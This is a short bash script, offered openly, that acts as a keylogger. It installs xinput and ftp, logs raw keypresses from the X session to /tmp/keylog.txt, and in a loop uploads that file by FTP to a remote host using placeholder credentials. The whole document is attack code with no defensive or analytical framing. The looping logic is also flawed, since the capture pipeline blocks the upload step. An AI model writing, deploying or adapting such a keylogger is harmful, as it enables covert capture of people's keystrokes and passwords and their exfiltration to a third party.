#!/bin/bash


HOST="ftp.server.com"
USERNAME="username"
PASSWORD="password"
FILE="/tmp/keylog.txt"

apt-get update
apt-get install -y xinput ftp


while true; do
    xinput test-xi2 --root | grep --line-buffered 'RawKeyPress\|RawKeyRelease' | awk '{print $NF}' >> /tmp/keylog.txt
    sleep 60
    ftp -n $HOST <<END_SCRIPT
    quote USER $USERNAME
    quote PASS $PASSWORD
    put $FILE
    quit
END_SCRIPT
done
